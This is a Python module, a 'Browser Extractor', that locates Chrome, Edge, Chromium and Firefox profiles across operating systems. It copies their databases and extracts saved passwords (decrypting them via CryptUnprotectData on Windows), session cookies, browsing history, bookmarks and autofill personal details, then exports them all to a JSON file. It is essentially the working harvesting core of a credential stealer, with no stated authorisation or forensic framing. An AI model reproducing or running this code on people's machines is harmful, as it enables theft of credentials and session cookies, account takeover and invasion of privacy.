
"""
Browser Extractor Module
Extract passwords, cookies, history, bookmarks, and autofill data
from Chrome, Firefox, and other browsers.
"""

import os
import json
import sqlite3
import shutil
import tempfile
import base64
import hashlib
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, asdict
from datetime import datetime, timedelta
import logging
import platform
from pathlib import Path
import subprocess


logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@dataclass
class BrowserProfile:
    browser: str
    profile_name: str
    profile_path: str
    user_data_dir: str

@dataclass
class SavedPassword:
    url: str
    username: str
    password: str
    date_created: str
    date_last_used: str

@dataclass
class Cookie:
    host_key: str
    name: str
    value: str
    path: str
    expires_utc: str
    secure: bool
    httponly: bool

@dataclass
class HistoryEntry:
    url: str
    title: str
    visit_count: int
    last_visit_time: str

@dataclass
class Bookmark:
    url: str
    title: str
    date_added: str
    folder: str

@dataclass
class AutofillEntry:
    name: str
    value: str
    form_field_name: str
    count: int

class BrowserExtractor:
    def __init__(self):
        self.system = platform.system()
        self.profiles = []
        self.temp_dir = None
        

        self.browser_paths = self._get_browser_paths()
        

        self.temp_dir = tempfile.mkdtemp(prefix="browser_extract_")
    
    def _get_browser_paths(self) -> Dict[str, Dict[str, str]]:
        """Get browser installation paths by operating system"""
        paths = {}
        
        if self.system == "Windows":
            paths = {
                "chrome": {
                    "user_data": os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data"),
                    "executable": r"C:\Program Files\Google\Chrome\Application\chrome.exe"
                },
                "firefox": {
                    "profiles": os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles"),
                    "executable": r"C:\Program Files\Mozilla Firefox\firefox.exe"
                },
                "edge": {
                    "user_data": os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data"),
                    "executable": r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
                }
            }
        elif self.system == "Darwin":
            home = os.path.expanduser("~")
            paths = {
                "chrome": {
                    "user_data": f"{home}/Library/Application Support/Google/Chrome",
                    "executable": "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
                },
                "firefox": {
                    "profiles": f"{home}/Library/Application Support/Firefox/Profiles",
                    "executable": "/Applications/Firefox.app/Contents/MacOS/firefox"
                },
                "safari": {
                    "user_data": f"{home}/Library/Safari",
                    "executable": "/Applications/Safari.app/Contents/MacOS/Safari"
                }
            }
        else:
            home = os.path.expanduser("~")
            paths = {
                "chrome": {
                    "user_data": f"{home}/.config/google-chrome",
                    "executable": "/usr/bin/google-chrome"
                },
                "chromium": {
                    "user_data": f"{home}/.config/chromium",
                    "executable": "/usr/bin/chromium-browser"
                },
                "firefox": {
                    "profiles": f"{home}/.mozilla/firefox",
                    "executable": "/usr/bin/firefox"
                }
            }
        
        return paths
    
    def discover_browser_profiles(self) -> List[BrowserProfile]:
        """Discover all available browser profiles"""
        profiles = []
        
        for browser, config in self.browser_paths.items():
            try:
                if browser == "firefox":
                    profiles.extend(self._discover_firefox_profiles(config))
                else:
                    profiles.extend(self._discover_chrome_profiles(browser, config))
            except Exception as e:
                logger.debug(f"Failed to discover {browser} profiles: {e}")
        
        self.profiles = profiles
        logger.info(f"Discovered {len(profiles)} browser profiles")
        return profiles
    
    def _discover_chrome_profiles(self, browser: str, config: Dict[str, str]) -> List[BrowserProfile]:
        """Discover Chrome/Chromium-based browser profiles"""
        profiles = []
        
        user_data_dir = config.get("user_data")
        if not user_data_dir or not os.path.exists(user_data_dir):
            return profiles
        

        default_profile = os.path.join(user_data_dir, "Default")
        if os.path.exists(default_profile):
            profiles.append(BrowserProfile(
                browser=browser,
                profile_name="Default",
                profile_path=default_profile,
                user_data_dir=user_data_dir
            ))
        

        for item in os.listdir(user_data_dir):
            if item.startswith("Profile ") and os.path.isdir(os.path.join(user_data_dir, item)):
                profile_path = os.path.join(user_data_dir, item)
                profiles.append(BrowserProfile(
                    browser=browser,
                    profile_name=item,
                    profile_path=profile_path,
                    user_data_dir=user_data_dir
                ))
        
        return profiles
    
    def _discover_firefox_profiles(self, config: Dict[str, str]) -> List[BrowserProfile]:
        """Discover Firefox profiles"""
        profiles = []
        
        profiles_dir = config.get("profiles")
        if not profiles_dir or not os.path.exists(profiles_dir):
            return profiles
        

        profiles_ini = os.path.join(os.path.dirname(profiles_dir), "profiles.ini")
        if os.path.exists(profiles_ini):
            profiles.extend(self._parse_firefox_profiles_ini(profiles_ini))
        else:

            for item in os.listdir(profiles_dir):
                profile_path = os.path.join(profiles_dir, item)
                if os.path.isdir(profile_path):
                    profiles.append(BrowserProfile(
                        browser="firefox",
                        profile_name=item,
                        profile_path=profile_path,
                        user_data_dir=profiles_dir
                    ))
        
        return profiles
    
    def _parse_firefox_profiles_ini(self, profiles_ini: str) -> List[BrowserProfile]:
        """Parse Firefox profiles.ini file"""
        profiles = []
        
        try:
            with open(profiles_ini, 'r', encoding='utf-8') as f:
                content = f.read()
            
            current_profile = {}
            for line in content.split('\n'):
                line = line.strip()
                
                if line.startswith('[Profile'):
                    if current_profile:
                        profiles.append(self._create_firefox_profile(current_profile))
                    current_profile = {}
                elif '=' in line and current_profile is not None:
                    key, value = line.split('=', 1)
                    current_profile[key] = value
            

            if current_profile:
                profiles.append(self._create_firefox_profile(current_profile))
                
        except Exception as e:
            logger.error(f"Failed to parse profiles.ini: {e}")
        
        return profiles
    
    def _create_firefox_profile(self, profile_data: Dict[str, str]) -> BrowserProfile:
        """Create Firefox profile object from parsed data"""
        name = profile_data.get('Name', 'Unknown')
        path = profile_data.get('Path', '')
        
        if profile_data.get('IsRelative', '1') == '1':

            firefox_dir = os.path.dirname(self.browser_paths["firefox"]["profiles"])
            profile_path = os.path.join(firefox_dir, path)
        else:

            profile_path = path
        
        return BrowserProfile(
            browser="firefox",
            profile_name=name,
            profile_path=profile_path,
            user_data_dir=os.path.dirname(profile_path)
        )
    
    def extract_passwords(self, profile: BrowserProfile) -> List[SavedPassword]:
        """Extract saved passwords from browser profile"""
        passwords = []
        
        try:
            if profile.browser == "firefox":
                passwords = self._extract_firefox_passwords(profile)
            else:
                passwords = self._extract_chrome_passwords(profile)
            
            logger.info(f"Extracted {len(passwords)} passwords from {profile.browser}")
            
        except Exception as e:
            logger.error(f"Failed to extract passwords from {profile.browser}: {e}")
        
        return passwords
    
    def _extract_chrome_passwords(self, profile: BrowserProfile) -> List[SavedPassword]:
        """Extract passwords from Chrome/Chromium-based browsers"""
        passwords = []
        
        login_data_path = os.path.join(profile.profile_path, "Login Data")
        if not os.path.exists(login_data_path):
            return passwords
        

        temp_db = os.path.join(self.temp_dir, f"login_data_{profile.profile_name}.db")
        shutil.copy2(login_data_path, temp_db)
        
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT origin_url, username_value, password_value, date_created, date_last_used
                FROM logins
                WHERE blacklisted_by_user = 0
            """)
            
            for row in cursor.fetchall():
                url, username, encrypted_password, date_created, date_last_used = row
                

                decrypted_password = self._decrypt_chrome_password(encrypted_password)
                

                created_time = self._chrome_timestamp_to_datetime(date_created)
                last_used_time = self._chrome_timestamp_to_datetime(date_last_used)
                
                passwords.append(SavedPassword(
                    url=url,
                    username=username,
                    password=decrypted_password,
                    date_created=created_time,
                    date_last_used=last_used_time
                ))
            
            conn.close()
            
        except sqlite3.Error as e:
            logger.error(f"Database error extracting Chrome passwords: {e}")
        finally:
            if os.path.exists(temp_db):
                os.unlink(temp_db)
        
        return passwords
    
    def _extract_firefox_passwords(self, profile: BrowserProfile) -> List[SavedPassword]:
        """Extract passwords from Firefox"""
        passwords = []
        

        logins_path = os.path.join(profile.profile_path, "logins.json")
        key_db_path = os.path.join(profile.profile_path, "key4.db")
        
        if not os.path.exists(logins_path) or not os.path.exists(key_db_path):
            return passwords
        
        try:
            with open(logins_path, 'r', encoding='utf-8') as f:
                logins_data = json.load(f)
            
            for login in logins_data.get('logins', []):


                passwords.append(SavedPassword(
                    url=login.get('hostname', ''),
                    username=login.get('encryptedUsername', ''),
                    password="[ENCRYPTED - Requires NSS decryption]",
                    date_created=str(login.get('timeCreated', 0)),
                    date_last_used=str(login.get('timeLastUsed', 0))
                ))
                
        except (json.JSONDecodeError, FileNotFoundError) as e:
            logger.error(f"Failed to parse Firefox logins: {e}")
        
        return passwords
    
    def _decrypt_chrome_password(self, encrypted_password: bytes) -> str:
        """Decrypt Chrome password (simplified - actual decryption is OS-specific)"""
        try:
            if self.system == "Windows":

                try:
                    import win32crypt
                    return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode('utf-8')
                except ImportError:
                    return "[ENCRYPTED - win32crypt not available]"
            elif self.system == "Darwin":

                return "[ENCRYPTED - macOS Keychain decryption required]"
            else:


                if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
                    return "[ENCRYPTED - AES encryption]"
                else:

                    return encrypted_password.decode('utf-8', errors='ignore')
        except Exception as e:
            logger.debug(f"Password decryption failed: {e}")
            return "[DECRYPTION_FAILED]"
    
    def extract_cookies(self, profile: BrowserProfile) -> List[Cookie]:
        """Extract cookies from browser profile"""
        cookies = []
        
        try:
            if profile.browser == "firefox":
                cookies = self._extract_firefox_cookies(profile)
            else:
                cookies = self._extract_chrome_cookies(profile)
            
            logger.info(f"Extracted {len(cookies)} cookies from {profile.browser}")
            
        except Exception as e:
            logger.error(f"Failed to extract cookies from {profile.browser}: {e}")
        
        return cookies
    
    def _extract_chrome_cookies(self, profile: BrowserProfile) -> List[Cookie]:
        """Extract cookies from Chrome/Chromium-based browsers"""
        cookies = []
        
        cookies_path = os.path.join(profile.profile_path, "Network", "Cookies")
        if not os.path.exists(cookies_path):

            cookies_path = os.path.join(profile.profile_path, "Cookies")
            if not os.path.exists(cookies_path):
                return cookies
        

        temp_db = os.path.join(self.temp_dir, f"cookies_{profile.profile_name}.db")
        shutil.copy2(cookies_path, temp_db)
        
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly
                FROM cookies
                ORDER BY host_key, name
            """)
            
            for row in cursor.fetchall():
                host_key, name, value, path, expires_utc, is_secure, is_httponly = row
                

                expires_time = self._chrome_timestamp_to_datetime(expires_utc) if expires_utc else ""
                
                cookies.append(Cookie(
                    host_key=host_key,
                    name=name,
                    value=value,
                    path=path,
                    expires_utc=expires_time,
                    secure=bool(is_secure),
                    httponly=bool(is_httponly)
                ))
            
            conn.close()
            
        except sqlite3.Error as e:
            logger.error(f"Database error extracting Chrome cookies: {e}")
        finally:
            if os.path.exists(temp_db):
                os.unlink(temp_db)
        
        return cookies
    
    def _extract_firefox_cookies(self, profile: BrowserProfile) -> List[Cookie]:
        """Extract cookies from Firefox"""
        cookies = []
        
        cookies_path = os.path.join(profile.profile_path, "cookies.sqlite")
        if not os.path.exists(cookies_path):
            return cookies
        

        temp_db = os.path.join(self.temp_dir, f"firefox_cookies_{profile.profile_name}.db")
        shutil.copy2(cookies_path, temp_db)
        
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT host, name, value, path, expiry, isSecure, isHttpOnly
                FROM moz_cookies
                ORDER BY host, name
            """)
            
            for row in cursor.fetchall():
                host, name, value, path, expiry, is_secure, is_httponly = row
                

                expires_time = datetime.fromtimestamp(expiry).isoformat() if expiry else ""
                
                cookies.append(Cookie(
                    host_key=host,
                    name=name,
                    value=value,
                    path=path,
                    expires_utc=expires_time,
                    secure=bool(is_secure),
                    httponly=bool(is_httponly)
                ))
            
            conn.close()
            
        except sqlite3.Error as e:
            logger.error(f"Database error extracting Firefox cookies: {e}")
        finally:
            if os.path.exists(temp_db):
                os.unlink(temp_db)
        
        return cookies
    
    def extract_history(self, profile: BrowserProfile, days: int = 30) -> List[HistoryEntry]:
        """Extract browsing history from browser profile"""
        history = []
        
        try:
            if profile.browser == "firefox":
                history = self._extract_firefox_history(profile, days)
            else:
                history = self._extract_chrome_history(profile, days)
            
            logger.info(f"Extracted {len(history)} history entries from {profile.browser}")
            
        except Exception as e:
            logger.error(f"Failed to extract history from {profile.browser}: {e}")
        
        return history
    
    def _extract_chrome_history(self, profile: BrowserProfile, days: int) -> List[HistoryEntry]:
        """Extract history from Chrome/Chromium-based browsers"""
        history = []
        
        history_path = os.path.join(profile.profile_path, "History")
        if not os.path.exists(history_path):
            return history
        

        temp_db = os.path.join(self.temp_dir, f"history_{profile.profile_name}.db")
        shutil.copy2(history_path, temp_db)
        
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            

            cutoff_time = datetime.now() - timedelta(days=days)
            cutoff_timestamp = int(cutoff_time.timestamp() * 1000000) + 11644473600000000
            
            cursor.execute("""
                SELECT url, title, visit_count, last_visit_time
                FROM urls
                WHERE last_visit_time > ?
                ORDER BY visit_count DESC, last_visit_time DESC
            """, (cutoff_timestamp,))
            
            for row in cursor.fetchall():
                url, title, visit_count, last_visit_time = row
                

                visit_time = self._chrome_timestamp_to_datetime(last_visit_time)
                
                history.append(HistoryEntry(
                    url=url,
                    title=title or "[No Title]",
                    visit_count=visit_count,
                    last_visit_time=visit_time
                ))
            
            conn.close()
            
        except sqlite3.Error as e:
            logger.error(f"Database error extracting Chrome history: {e}")
        finally:
            if os.path.exists(temp_db):
                os.unlink(temp_db)
        
        return history
    
    def _extract_firefox_history(self, profile: BrowserProfile, days: int) -> List[HistoryEntry]:
        """Extract history from Firefox"""
        history = []
        
        places_path = os.path.join(profile.profile_path, "places.sqlite")
        if not os.path.exists(places_path):
            return history
        

        temp_db = os.path.join(self.temp_dir, f"firefox_places_{profile.profile_name}.db")
        shutil.copy2(places_path, temp_db)
        
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            

            cutoff_time = datetime.now() - timedelta(days=days)
            cutoff_timestamp = int(cutoff_time.timestamp() * 1000000)
            
            cursor.execute("""
                SELECT h.url, h.title, h.visit_count, h.last_visit_date
                FROM moz_places h
                WHERE h.last_visit_date > ?
                AND h.visit_count > 0
                ORDER BY h.visit_count DESC, h.last_visit_date DESC
            """, (cutoff_timestamp,))
            
            for row in cursor.fetchall():
                url, title, visit_count, last_visit_date = row
                

                visit_time = datetime.fromtimestamp(last_visit_date / 1000000).isoformat() if last_visit_date else ""
                
                history.append(HistoryEntry(
                    url=url,
                    title=title or "[No Title]",
                    visit_count=visit_count,
                    last_visit_time=visit_time
                ))
            
            conn.close()
            
        except sqlite3.Error as e:
            logger.error(f"Database error extracting Firefox history: {e}")
        finally:
            if os.path.exists(temp_db):
                os.unlink(temp_db)
        
        return history
    
    def extract_bookmarks(self, profile: BrowserProfile) -> List[Bookmark]:
        """Extract bookmarks from browser profile"""
        bookmarks = []
        
        try:
            if profile.browser == "firefox":
                bookmarks = self._extract_firefox_bookmarks(profile)
            else:
                bookmarks = self._extract_chrome_bookmarks(profile)
            
            logger.info(f"Extracted {len(bookmarks)} bookmarks from {profile.browser}")
            
        except Exception as e:
            logger.error(f"Failed to extract bookmarks from {profile.browser}: {e}")
        
        return bookmarks
    
    def _extract_chrome_bookmarks(self, profile: BrowserProfile) -> List[Bookmark]:
        """Extract bookmarks from Chrome/Chromium-based browsers"""
        bookmarks = []
        
        bookmarks_path = os.path.join(profile.profile_path, "Bookmarks")
        if not os.path.exists(bookmarks_path):
            return bookmarks
        
        try:
            with open(bookmarks_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
            

            def extract_from_folder(folder, folder_name=""):
                for child in folder.get('children', []):
                    if child['type'] == 'url':

                        date_added = self._chrome_timestamp_to_datetime(int(child.get('date_added', 0)))
                        
                        bookmarks.append(Bookmark(
                            url=child['url'],
                            title=child['name'],
                            date_added=date_added,
                            folder=folder_name
                        ))
                    elif child['type'] == 'folder':
                        extract_from_folder(child, child['name'])
            

            roots = data.get('roots', {})
            for root_name, root_folder in roots.items():
                if isinstance(root_folder, dict) and 'children' in root_folder:
                    extract_from_folder(root_folder, root_name)
            
        except (json.JSONDecodeError, FileNotFoundError) as e:
            logger.error(f"Failed to parse Chrome bookmarks: {e}")
        
        return bookmarks
    
    def _extract_firefox_bookmarks(self, profile: BrowserProfile) -> List[Bookmark]:
        """Extract bookmarks from Firefox"""
        bookmarks = []
        
        places_path = os.path.join(profile.profile_path, "places.sqlite")
        if not os.path.exists(places_path):
            return bookmarks
        

        temp_db = os.path.join(self.temp_dir, f"firefox_bookmarks_{profile.profile_name}.db")
        shutil.copy2(places_path, temp_db)
        
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT b.fk, b.title, p.url, b.dateAdded, f.title as folder_title
                FROM moz_bookmarks b
                JOIN moz_places p ON b.fk = p.id
                LEFT JOIN moz_bookmarks f ON b.parent = f.id
                WHERE b.type = 1 AND p.url IS NOT NULL
                ORDER BY b.dateAdded DESC
            """)
            
            for row in cursor.fetchall():
                fk, title, url, date_added, folder_title = row
                

                added_time = datetime.fromtimestamp(date_added / 1000000).isoformat() if date_added else ""
                
                bookmarks.append(Bookmark(
                    url=url,
                    title=title or "[No Title]",
                    date_added=added_time,
                    folder=folder_title or "Root"
                ))
            
            conn.close()
            
        except sqlite3.Error as e:
            logger.error(f"Database error extracting Firefox bookmarks: {e}")
        finally:
            if os.path.exists(temp_db):
                os.unlink(temp_db)
        
        return bookmarks
    
    def extract_autofill_data(self, profile: BrowserProfile) -> List[AutofillEntry]:
        """Extract autofill/form data from browser profile"""
        autofill = []
        
        try:
            if profile.browser == "firefox":
                autofill = self._extract_firefox_autofill(profile)
            else:
                autofill = self._extract_chrome_autofill(profile)
            
            logger.info(f"Extracted {len(autofill)} autofill entries from {profile.browser}")
            
        except Exception as e:
            logger.error(f"Failed to extract autofill data from {profile.browser}: {e}")
        
        return autofill
    
    def _extract_chrome_autofill(self, profile: BrowserProfile) -> List[AutofillEntry]:
        """Extract autofill data from Chrome/Chromium-based browsers"""
        autofill = []
        
        web_data_path = os.path.join(profile.profile_path, "Web Data")
        if not os.path.exists(web_data_path):
            return autofill
        

        temp_db = os.path.join(self.temp_dir, f"web_data_{profile.profile_name}.db")
        shutil.copy2(web_data_path, temp_db)
        
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            

            cursor.execute("""
                SELECT name, value, count
                FROM autofill
                ORDER BY count DESC, name
            """)
            
            for row in cursor.fetchall():
                name, value, count = row
                
                autofill.append(AutofillEntry(
                    name=name,
                    value=value,
                    form_field_name=name,
                    count=count
                ))
            

            cursor.execute("""
                SELECT first_name, middle_name, last_name, email, company_name,
                       address_line_1, address_line_2, city, state, zipcode, country_code
                FROM autofill_profiles
            """)
            
            for row in cursor.fetchall():
                fields = ['first_name', 'middle_name', 'last_name', 'email', 'company_name',
                         'address_line_1', 'address_line_2', 'city', 'state', 'zipcode', 'country_code']
                
                for i, field_name in enumerate(fields):
                    if row[i]:
                        autofill.append(AutofillEntry(
                            name=field_name,
                            value=row[i],
                            form_field_name=field_name,
                            count=1
                        ))
            
            conn.close()
            
        except sqlite3.Error as e:
            logger.error(f"Database error extracting Chrome autofill: {e}")
        finally:
            if os.path.exists(temp_db):
                os.unlink(temp_db)
        
        return autofill
    
    def _extract_firefox_autofill(self, profile: BrowserProfile) -> List[AutofillEntry]:
        """Extract autofill data from Firefox"""
        autofill = []
        
        formhistory_path = os.path.join(profile.profile_path, "formhistory.sqlite")
        if not os.path.exists(formhistory_path):
            return autofill
        

        temp_db = os.path.join(self.temp_dir, f"firefox_formhistory_{profile.profile_name}.db")
        shutil.copy2(formhistory_path, temp_db)
        
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT fieldname, value, timesUsed
                FROM moz_formhistory
                ORDER BY timesUsed DESC, fieldname
            """)
            
            for row in cursor.fetchall():
                fieldname, value, times_used = row
                
                autofill.append(AutofillEntry(
                    name=fieldname,
                    value=value,
                    form_field_name=fieldname,
                    count=times_used
                ))
            
            conn.close()
            
        except sqlite3.Error as e:
            logger.error(f"Database error extracting Firefox autofill: {e}")
        finally:
            if os.path.exists(temp_db):
                os.unlink(temp_db)
        
        return autofill
    
    def _chrome_timestamp_to_datetime(self, timestamp: int) -> str:
        """Convert Chrome timestamp to readable datetime"""
        if timestamp == 0:
            return ""
        
        try:

            epoch_start = datetime(1601, 1, 1)
            delta = timedelta(microseconds=timestamp)
            return (epoch_start + delta).isoformat()
        except (ValueError, OverflowError):
            return "Invalid timestamp"
    
    def export_all_data(self, output_file: str = None) -> str:
        """Export all extracted browser data to JSON"""
        if not output_file:
            output_file = f"browser_data_{int(datetime.now().timestamp())}.json"
        
        all_data = {
            'extraction_timestamp': datetime.now().isoformat(),
            'system': self.system,
            'profiles': [],
            'summary': {
                'total_profiles': 0,
                'total_passwords': 0,
                'total_cookies': 0,
                'total_history_entries': 0,
                'total_bookmarks': 0,
                'total_autofill_entries': 0
            }
        }
        
        if not self.profiles:
            self.discover_browser_profiles()
        
        for profile in self.profiles:
            logger.info(f"Extracting data from {profile.browser} - {profile.profile_name}")
            

            passwords = self.extract_passwords(profile)
            cookies = self.extract_cookies(profile)
            history = self.extract_history(profile)
            bookmarks = self.extract_bookmarks(profile)
            autofill = self.extract_autofill_data(profile)
            
            profile_data = {
                'profile': asdict(profile),
                'passwords': [asdict(p) for p in passwords],
                'cookies': [asdict(c) for c in cookies],
                'history': [asdict(h) for h in history],
                'bookmarks': [asdict(b) for b in bookmarks],
                'autofill': [asdict(a) for a in autofill],
                'counts': {
                    'passwords': len(passwords),
                    'cookies': len(cookies),
                    'history_entries': len(history),
                    'bookmarks': len(bookmarks),
                    'autofill_entries': len(autofill)
                }
            }
            
            all_data['profiles'].append(profile_data)
            

            all_data['summary']['total_passwords'] += len(passwords)
            all_data['summary']['total_cookies'] += len(cookies)
            all_data['summary']['total_history_entries'] += len(history)
            all_data['summary']['total_bookmarks'] += len(bookmarks)
            all_data['summary']['total_autofill_entries'] += len(autofill)
        
        all_data['summary']['total_profiles'] = len(self.profiles)
        
        try:
            with open(output_file, 'w', encoding='utf-8') as f:
                json.dump(all_data, f, indent=2, ensure_ascii=False)
            
            logger.info(f"Browser data exported to {output_file}")
            return output_file
            
        except Exception as e:
            logger.error(f"Failed to export browser data: {e}")
            return ""
    
    def cleanup(self):
        """Cleanup temporary files"""
        if self.temp_dir and os.path.exists(self.temp_dir):
            shutil.rmtree(self.temp_dir, ignore_errors=True)
            logger.info("Temporary files cleaned up")


def main():
    """Example usage of BrowserExtractor"""
    extractor = BrowserExtractor()
    
    try:
        print("Browser Extractor - Advanced Browser Data Extraction")
        print("=" * 50)
        

        print("\n1. Discovering browser profiles...")
        profiles = extractor.discover_browser_profiles()
        
        for profile in profiles:
            print(f"  {profile.browser} - {profile.profile_name}: {profile.profile_path}")
        
        if not profiles:
            print("  No browser profiles found")
            return
        

        profile = profiles[0]
        print(f"\n2. Extracting data from {profile.browser} - {profile.profile_name}")
        

        print("   - Extracting passwords...")
        passwords = extractor.extract_passwords(profile)
        print(f"     Found {len(passwords)} saved passwords")
        

        print("   - Extracting cookies...")
        cookies = extractor.extract_cookies(profile)
        print(f"     Found {len(cookies)} cookies")
        

        print("   - Extracting history...")
        history = extractor.extract_history(profile, days=7)
        print(f"     Found {len(history)} history entries (last 7 days)")
        

        print("   - Extracting bookmarks...")
        bookmarks = extractor.extract_bookmarks(profile)
        print(f"     Found {len(bookmarks)} bookmarks")
        

        print("   - Extracting autofill data...")
        autofill = extractor.extract_autofill_data(profile)
        print(f"     Found {len(autofill)} autofill entries")
        

        print("\n3. Sample data:")
        if history:
            print("   Recent history entries:")
            for entry in history[:3]:
                print(f"     - {entry.title[:50]}... ({entry.visit_count} visits)")
        
        if bookmarks:
            print("   Sample bookmarks:")
            for bookmark in bookmarks[:3]:
                print(f"     - {bookmark.title[:50]}...")
        

        print("\n4. Exporting all browser data...")
        output_file = extractor.export_all_data()
        if output_file:
            print(f"   Data exported to: {output_file}")
        
    except KeyboardInterrupt:
        print("\nOperation cancelled by user")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        extractor.cleanup()


if __name__ == "__main__":
    main()
